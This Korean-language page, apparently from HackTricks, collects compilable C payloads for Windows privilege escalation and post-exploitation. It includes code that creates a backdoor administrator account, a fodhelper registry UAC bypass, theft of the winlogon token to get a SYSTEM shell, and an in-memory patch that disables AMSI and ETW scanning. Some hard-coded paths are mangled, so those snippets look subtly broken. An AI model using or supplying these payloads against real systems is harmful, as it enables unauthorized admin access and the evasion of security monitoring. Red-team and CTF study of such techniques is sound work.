# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 Windows Local Privilege Escalation 또는 post-exploitation 중에 유용한 **작고 독립적인 C snippets**을 모아둔 것입니다. 각 payload는 **복사-붙여넣기 친화적**으로 설계되었으며, Windows API / C runtime만 필요하고 `i686-w64-mingw32-gcc` (x86) 또는 `x86_64-w64-mingw32-gcc` (x64)로 컴파일할 수 있습니다.

> ⚠️  이 payload들은 프로세스가 이미 해당 작업을 수행하는 데 필요한 최소 권한(예: `SeDebugPrivilege`, `SeImpersonatePrivilege`, 또는 UAC bypass를 위한 medium-integrity 컨텍스트)을 가지고 있다고 가정합니다. 이들은 취약점을 이용해 임의의 네이티브 코드 실행을 얻은 **red-team 또는 CTF 설정**에서 사용하기 위한 것입니다.

---

## 로컬 관리자 사용자 추가
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
신뢰된 바이너리 **`fodhelper.exe`**가 실행될 때, 아래 레지스트리 경로를 조회하며 **`DelegateExecute` 동사를 필터링하지 않습니다**. 해당 키 아래에 명령을 심으면 공격자는 파일을 디스크에 쓰지 *않고* UAC를 우회할 수 있습니다.

*`fodhelper.exe`가 조회하는 레지스트리 경로*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
권한이 상승된 `cmd.exe`를 실행하는 최소한의 PoC:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 및 Windows 11 23H2(2025년 7월 패치)에서 테스트했습니다. Microsoft가 `DelegateExecute` 경로의 누락된 무결성 검사를 수정하지 않아 이 우회가 여전히 작동합니다.*

---

## 토큰 복제를 통한 SYSTEM 쉘 획득 (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
현재 프로세스가 **둘 다** `SeDebug` 및 `SeImpersonate` 권한을 보유한 경우(많은 서비스 계정에서 일반적임), `winlogon.exe`의 토큰을 훔쳐 복제한 뒤 권한 상승된 프로세스를 시작할 수 있습니다:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
작동 방식에 대한 더 자세한 설명은 다음을 참조하세요:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
대부분의 최신 AV/EDR 엔진은 악성 동작을 검사하기 위해 **AMSI**와 **ETW**에 의존합니다. 현재 프로세스 내부에서 이 두 인터페이스를 조기에 패치하면 스크립트 기반 페이로드(예: PowerShell, JScript)가 스캔되는 것을 방지할 수 있습니다.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*위의 패치는 프로세스 로컬입니다; 이를 실행한 뒤 새 PowerShell을 생성하면 AMSI/ETW 검사 없이 실행됩니다.*

---

## 자식 프로세스를 Protected Process Light (PPL)로 생성
생성 시 `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`를 사용하여 자식 프로세스에 대해 PPL 보호 수준을 요청합니다. 이 API는 문서화되어 있으며 대상 이미지가 요청된 서명자 클래스(Windows/WindowsLight/Antimalware/LSA/WinTcb)용으로 서명되어 있어야만 성공합니다.
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
일반적으로 가장 자주 사용되는 레벨:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

결과는 Process Explorer/Process Hacker에서 Protection 열을 확인하여 검증하세요.

---

## 참고자료
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute

{{#include ../../banners/hacktricks-training.md}}
